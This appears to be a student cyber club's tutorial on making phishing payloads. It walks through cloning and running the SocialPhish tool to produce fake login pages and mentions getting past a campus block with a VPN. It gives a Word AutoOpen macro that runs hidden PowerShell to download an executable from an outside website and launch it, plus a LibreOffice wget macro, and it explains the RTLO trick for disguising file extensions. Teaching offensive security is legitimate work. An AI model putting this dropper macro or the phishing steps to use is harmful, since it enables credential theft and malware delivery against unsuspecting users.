# Making a Phishing Payload
The content shared and discussed in this club meeting is for educational purposes only

I have made a harmless program at <https://umlcyber.club/watcher_1.exe> for you to download and run as part of your macros. It is not malicious, but it is annoying to remove. So don't run it on your main Windows computer!
## Social Phish
UML blocks serveo.net because it is malware. So you will need to use a VPN or the Cyber Range computers.

> git clone https://github.com/pvanfas/socialphish.git
> cd socialphish
> chmod +x socialphish.sh
> ./socialphish

When it says "Choose an option", type the number of the login form you want to make.

When it says "Choose a port forwarding option", just press enter.

When it says "Choose a port", just press enter.

Go to the URL it gives you. Fake login page. Pretty sweet!

## Macros
### Windows
You can install microsoft office using your UML email account.

To make a new macro, go to "View" -> "Macros" -> "View Macros" -> "Create" (you need to give it a name first)

When saving your file, go to `Save As` and save it as a `Word Macro-Enabled Document (*.docm)`
```
Sub AutoOpen()
'
' AutoOpen Macro
'
'
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    Dim strCommand As String
    strCommand = "powershell -windowstyle hidden -command ""Invoke-WebRequest -Uri 'https://andrewbernal.com/watcher_1.exe' -OutFile '.\Downloads\watcher_1.exe'; .\Downloads\watcher_1.exe"""
    
    objShell.Run strCommand
    
    Set objShell = Nothing
End Sub
```
### Linux
LibreOffice has good security defaults! By default, only signed macros from trusted sources can run. To run your macros, you will have to lower the security level.

To lower the security level, go to "Tools" -> "Options" -> "Security" tab -> "Macro Security" and set it to Medium or Low.

You can get a shell with linux macros, and then do whatever you want. For example:
```
Sub DownloadFile
    Shell("wget https://example.com/file.zip -O /path/to/save/file.zip")
End Sub
```

## RTLO Character
The RTLO character stands for Right-To-Left Override. It is a non-printing Unicode character, represented by the Unicode character code U+202E1. This character is used to write languages that are read in the right-to-left manner, such as Hebrew, Arabic, Aramaic, and Urdu. It takes the input and literally just flips the text the other way round.

The RTLO character can be used to reverse the display of text that follows it. For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx. Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type.

Get the character here: <https://unicode-explorer.com/c/202E>

## watcher_1.exe malware
> windres icon.rc -o icon.o
> g++ watcher_1.cpp icon.o -o watcher_1.exe -static -lpsapi